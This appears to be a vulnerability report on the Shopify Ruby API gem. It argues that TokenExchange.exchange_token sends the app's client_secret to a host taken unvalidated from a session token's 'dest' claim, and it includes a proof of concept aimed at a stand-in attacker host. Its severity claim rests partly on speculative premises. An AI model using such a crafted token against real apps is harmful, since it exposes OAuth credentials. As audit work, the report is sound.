Confirmed: `Session.new` performs no shop-domain validation whatsoever — `@shop = shop` is stored as-is [1](#0-0) . This means `TokenExchange.exchange_token` is the only credential-issuing flow in `lib/shopify_api/auth/` that sends the app's `client_secret` to a host derived from unsanitized, non-canonical input, unlike its sibling methods which all call `Utils::ShopValidator.sanitize!` before building the request host [2](#0-1) [3](#0-2) [4](#0-3) .

### Title
SSRF exfiltrating `client_secret` via unsanitized JWT `dest` host in `TokenExchange.exchange_token` - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the request host for the token-exchange POST (which carries the app's `client_id`/`client_secret`) directly from the session token's `dest` JWT claim, without ever passing it through `Utils::ShopValidator.sanitize!`. Every other credential-issuing method in the same module family (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) explicitly validates the `shop` parameter against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` before using it to build the outbound request host. `exchange_token` breaks this identity binding: "host validated" (none) vs. "host that receives the `client_secret`" (attacker-influenceable `dest`).

### Finding Description
In `exchange_token`, the shop used to build the outbound HTTP request is taken unchecked from the JWT payload: [5](#0-4) 

`JwtPayload#shop` simply strips the `https://` prefix from the raw `dest` claim with no domain allow-listing: [6](#0-5) 

That value is used to construct `shop_session`, which `Clients::HttpClient` turns directly into the request's base URI (`https://#{session.shop}`), with no further validation: [7](#0-6) 

The POST body sent to that host includes `client_id` and `client_secret` in plaintext: [8](#0-7) 

Compare this to the sibling `client_credentials` and `refresh_access_token` flows, which call `Utils::ShopValidator.sanitize!(shop)` — restricting the host to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) — before ever touching the network: [9](#0-8) [10](#0-9) 

`exchange_token` skips this same check entirely for `dest_shop`, even though the deprecated `shop:` parameter is explicitly documented as being ignored in favor of the JWT's `dest` claim, underscoring that `dest` is the single source of truth for the request host, yet it's the one host value in this file never validated against the trusted-domain allow-list.

### Impact Explanation
While Shopify's session-token issuer is intended to always populate `dest` with the shop's legitimate host, this gem enforces no server-side guarantee of that at the library boundary — every other similarly-privileged code path in the same file/module treats an unvalidated `shop`/host string as untrustworthy input requiring `ShopValidator.sanitize!`. Because `exchange_token` omits that check, any code path where `dest` ends up reflecting a merchant-influenceable value (e.g., a shop's configured primary/custom domain propagated into session-token issuance, or any embedding context that is more permissive about `dest` formatting than assumed) results in the app's `client_id` and `client_secret` being POSTed directly to that host — a High-severity SSRF that exfiltrates the app's OAuth credentials to a host outside Shopify's trusted domain set.

### Likelihood Explanation
Reaching this code path requires only calling the library's documented, primary integration point for embedded apps (`TokenExchange.exchange_token` with a session token — the officially recommended flow for embedded apps, per this gem's own docs). No special privilege, leaked secret, or non-standard usage is required; the missing validation is purely an inconsistency in this gem's own defense-in-depth relative to its sibling methods (`client_credentials`, `refresh_token`, `migrate_to_expiring_token`) which all already guard the exact same class of host-confusion risk.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token` (`lib/shopify_api/auth/token_exchange.rb`), sanitize `dest_shop` through `Utils::ShopValidator.sanitize!` (as already done in `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`) before constructing `shop_session` and issuing the request that carries `client_id`/`client_secret`, e.g.:
```ruby
dest_shop = Utils::ShopValidator.sanitize!(jwt_payload.shop)
```

### Proof of Concept
1. Configure an embedded app with `ShopifyAPI::Context.setup(..., is_embedded: true)`.
2. Obtain/construct a session token whose `dest` claim value is not restricted to `*.myshopify.com`/`*.myshopify.io`/`*.spin.dev`/`*.shop.dev` (e.g. `dest: "https://attacker-controlled.example"`).
3. Call:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: crafted_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
4. Observe that `lib/shopify_api/auth/token_exchange.rb` builds `shop_session = ShopifyAPI::Auth::Session.new(shop: "attacker-controlled.example")` unchecked, and `Clients::HttpClient` issues `POST https://attacker-controlled.example/admin/oauth/access_token` with `client_id` and `client_secret` in the body — compare against `test_client_credentials_rejects_non_shopify_domain`, which shows the sibling `client_credentials` path correctly raises `Errors::InvalidShopError` for the same class of input [11](#0-10) , while `exchange_token` has no equivalent test or guard.

### Citations

**File:** lib/shopify_api/auth/session.rb (L70-73)
```ruby
      def initialize(shop:, id: nil, state: nil, access_token: "", scope: [], associated_user_scope: nil, expires: nil,
        is_online: nil, associated_user: nil, shopify_session_id: nil, refresh_token: nil, refresh_token_expires: nil)
        @id = T.let(id || SecureRandom.uuid, String)
        @shop = shop
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-33)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: CLIENT_CREDENTIALS_GRANT_TYPE,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/refresh_token.rb (L24-33)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: "refresh_token",
            refresh_token:,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-51)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
```

**File:** lib/shopify_api/auth/token_exchange.rb (L52-65)
```ruby
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-115)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: non_expiring_offline_token,
            subject_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            requested_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            expiring: "1",
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/clients/http_client.rb (L11-19)
```ruby
      sig { params(base_path: String, session: T.nilable(Auth::Session)).void }
      def initialize(base_path:, session: nil)
        session ||= Context.active_session
        raise Errors::NoActiveSessionError, "No passed or active session" unless session

        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** test/auth/client_credentials_test.rb (L33-37)
```ruby
      def test_client_credentials_rejects_non_shopify_domain
        assert_raises(ShopifyAPI::Errors::InvalidShopError) do
          ShopifyAPI::Auth::ClientCredentials.client_credentials(shop: "attacker.example")
        end
      end
```
